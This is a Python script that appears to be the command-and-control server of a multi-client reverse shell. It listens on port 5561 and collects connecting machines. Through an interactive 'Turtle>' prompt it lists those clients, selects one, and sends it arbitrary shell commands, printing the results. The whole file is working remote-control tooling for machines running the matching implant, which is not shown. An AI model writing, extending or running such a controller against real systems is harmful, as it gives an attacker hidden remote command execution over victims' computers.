import socket
import sys
import time
import threading
from queue import Queue


host = ''
port = 5561
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
all_connections = []
all_address = []
queue = Queue()


def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Socket Created")
        s.bind((host, port))
        s.listen(5)
        return s
    except socket.error as e:
        print("Socket creation error " + str(e))

    

#Handling multiple connections and saving the connections in a list
# CLosing previous connections when server.py file is restarted

def accepting_connections(s):
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)    # A server times out and the connection is closed if no task is performed for a certain time. setblocking prevents that from happening i.e. it prevents timeout
            print("Client Connected : " + address[0] + " Port : " + str(address[1]))
            all_connections.append(conn)
            all_address.append(address)
        except:
            print("Error accepting connections")


# 2nd Thread
# Functions - 
#   1. See all the clients
#   2. Select a client
#   3. Send or receive command to or from the client

def start_turtle():
    while True:
        cmd = input("Turtle> ")
        if(cmd == 'list'):
            list_connections()
        elif('select' in cmd):
            conn = get_target(cmd)
            if(conn is not None):
                send_target_command(conn)
        else:
            print('Command not recognised')

def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results += str(i) + " " + str(all_address[i][0]) + " " + str(all_address[i][1]) + '\n'
    print("-----Clients-----" + '\n' + results)


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print('You are now connected to ' + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print('Selection not valid')



def send_target_command(conn):
    while True:
        try:
            message = input("")
            if(message == 'exit'):
                break
            elif(len(str.encode(message)) > 0):
                print('Trying to send the command. Please wait')
                conn.send(str.encode(message))
                client_response = str(conn.recv(20480), 'utf-8')
                if not client_response:
                    print('Client got disconnected')
                    break
                else:
                    print(client_response, end="")
        except Exception as e:
            print('Error sending command' + str(e))


    
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
            t = threading.Thread(target = work)
            t.daemon = True
            t.start()

def create_jobs():
    for i in JOB_NUMBER:
        queue.put(i)
    queue.join()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if(x == 1):
            s = create_socket()
            accepting_connections(s)
        elif(x==2):
            start_turtle()
        queue.task_done()


create_workers()
create_jobs()